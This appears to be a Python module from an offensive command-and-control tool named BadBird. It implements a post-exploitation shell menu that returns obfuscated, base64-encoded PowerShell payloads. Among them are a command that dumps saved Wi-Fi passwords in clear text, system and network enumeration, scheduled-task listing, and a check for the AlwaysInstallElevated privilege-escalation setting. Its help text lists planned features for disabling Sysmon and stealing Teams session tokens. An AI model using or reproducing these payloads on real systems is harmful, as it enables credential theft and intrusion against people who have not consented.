#!/usr/bin/env python3

# BadBird C2 Through Canarytokens
# Author: Austin Martin @amartinsec/blog.amartinsec.com
from colorama import Fore


def postExpWelcome():
    #More ASCII
    # fire ascii from https://ascii.co.uk/art/fire
    print(Fore.RED)
    print("                           (  .      )        ( ")
    print("         .-.            )           (           )   )")
    print("        (  '>                 .  '   .   '  .  '  . ")
    print("        /  \\        (    , )       (.   )  (   ',    )")
    print("       /  \ |         .' ) ( . )    ,  ( ,     )   ( .")
    print("      / ,_//       ). , ( .   (  ) ( , ')  .' (  ,    ) " )
    print(Fore.WHITE + "~~~~~" + Fore.RED + "//'--'" + Fore.WHITE + "~~~~~~~" + Fore.RED + "(_,) . ), ) _) _,')  (, ) '. )  ,. (' )" + Fore.WHITE + "~~~~")
    print("~~~~" + Fore.RED + "//" + Fore.WHITE + "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("~~~" + Fore.RED + "//" + Fore.WHITE + "~~~~~~~~~~~~~~~~~~~~~ " + Fore.RESET + "Post-Exp Shell " + Fore.WHITE + "~~~~~~~~~~~~~~~~~~~~~")

    print(Fore.RESET + "\nType `help` for a list of post-exploitation commands\n")


def postExpHelp():
    print(Fore.GREEN + "[+]" + Fore.RESET + " Post Exploitation Shell:\n")
    print("   `Back` or `Exit`:\tReturns to the main menu".expandtabs(40))
    print("   Help:\tPrints this menu".expandtabs(40))
    print("   Steal-wifi:\tGrabs all saved wireless credentials".expandtabs(40))
    print("   Basic-enum:\tBasic enumeration on the system".expandtabs(40))
    print("   Schedtasks:\tGrabs scheduled tasks on the system".expandtabs(40))
    print("   Elevated:\tChecks for the AlwaysInstalledElevated reg key for priv-esc".expandtabs(40))
    print("   Killproc:\tKills a process by PID(TODO)".expandtabs(40))
    print("   Sysmon-kill:\tStops sysmon(TODO)".expandtabs(40))
    print("   Byod:\tAttempts to elevate to SYSTEM by using the BYOD (Bring-your-own-driver) method(TODO)".expandtabs(40))
    print("   Cursed-chrome:\tCursed Chrome implementation(TODO)".expandtabs(40))
    print("   Team-thief <`cookies`/`snoop`>:\tSteal the user's MS Teams session token or grabs cached conversations(TODO)".expandtabs(40))
    print("   Reg stuff:\tFun post-exp registry stuff here(TODO)\n".expandtabs(40))

showArt = True
def postExpShell():
    global showArt
    if showArt:
        postExpWelcome()
        showArt=False
    while True:
        user_input = input(Fore.GREEN + "Post-Exp>> " + Fore.RESET)
        if user_input.lower() == "back" or user_input.lower() == "exit":
            print(Fore.RESET + "Returning to main menu...\n")
            showArt = True
            return ""
        elif user_input.lower() == "help":
            postExpHelp()

        elif user_input.lower() == "steal-wifi":
            return 'powershell.exe -e KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBvAGYAaQBsAGUAcwApACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiAFwAOgAoAC4AKwApACQAIgAgAHwAIAAlAHsAJABuAGEAbQBlAD0AJABfAC4ATQBhAHQAYwBoAGUAcwAuAEcAcgBvAHUAcABzAFsAMQBdAC4AVgBhAGwAdQBlAC4AVAByAGkAbQAoACkAOwAgACQAXwB9ACAAfAAgACUAewAoAG4AZQB0AHMAaAAgAHcAbABhAG4AIABzAGgAbwB3ACAAcAByAG8AZgBpAGwAZQAgAG4AYQBtAGUAPQAiACQAbgBhAG0AZQAiACAAawBlAHkAPQBjAGwAZQBhAHIAKQB9ACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiAEsAZQB5ACAAQwBvAG4AdABlAG4AdABcAFcAKwBcADoAKAAuACsAKQAkACIAIAB8ACAAJQB7ACQAcABhAHMAcwA9ACQAXwAuAE0AYQB0AGMAaABlAHMALgBHAHIAbwB1AHAAcwBbADEAXQAuAFYAYQBsAHUAZQAuAFQAcgBpAG0AKAApADsAIAAkAF8AfQAgAHwAIAAlAHsAWwBQAFMAQwB1AHMAdABvAG0ATwBiAGoAZQBjAHQAXQBAAHsAIABQAFIATwBGAEkATABFAF8ATgBBAE0ARQA9ACQAbgBhAG0AZQA7AFAAQQBTAFMAVwBPAFIARAA9ACQAcABhAHMAcwAgAH0AfQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlAA=='

        elif user_input.lower() == "basic-enum":
            return 'powershell.exe -e ZQBjAGgAbwAgACIALQAtAC0AdwBoAG8AYQBtAGkALQAtAC0AIgA7AHcAaABvAGEAbQBpACAALwBhAGwAbAA7AGUAYwBoAG8AIAAiAC0ALQAtAHUAcwBlAHIAcwAvAGcAcgBvAHUAcABzAC0ALQAtACIAOwAgAG4AZQB0ACAAdQBzAGUAcgBzADsAbgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwADsAbgBlAHQAIABnAHIAbwB1AHAAIAAvAGQAbwBtAGEAaQBuADsAZQBjAGgAbwAgACIALQAtAC0AUABhAHQAYwBoAGUAcwAtAC0ALQAiADsAdwBtAGkAYwAgAHEAZgBlACAAZwBlAHQAIABDAGEAcAB0AGkAbwBuACwARABlAHMAYwByAGkAcAB0AGkAbwBuACwASABvAHQARgBpAHgASQBEACwASQBuAHMAdABhAGwAbABlAGQATwBuADsAZQBjAGgAbwAgACIALQAtAC0ATgBlAHQAdwBvAHIAawAtAC0ALQAiADsAIABuAGUAdABzAGgAIABmAGkAcgBlAHcAYQBsAGwAIABzAGgAbwB3ACAAcwB0AGEAdABlADsAIABuAGUAdABzAGgAIABmAGkAcgBlAHcAYQBsAGwAIABzAGgAbwB3ACAAYwBvAG4AZgBpAGcAOwAgAHIAbwB1AHQAZQAgAHAAcgBpAG4AdAA7AGkAcABjAG8AbgBmAGkAZwAgAC8AYQBsAGwA'

        elif user_input.lower() == "schedtasks":
            return 'powershell.exe -c "Get-ScheduledTask | Select-Object TaskName,TaskPath,State,TaskToRun | Format-Table -AutoSize"'

        elif user_input.lower() == "elevated":
            return "powershell.exe -c 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated'"

        else:
            print(Fore.RED + "[-]" + Fore.RESET + " Unknown command: " + user_input)

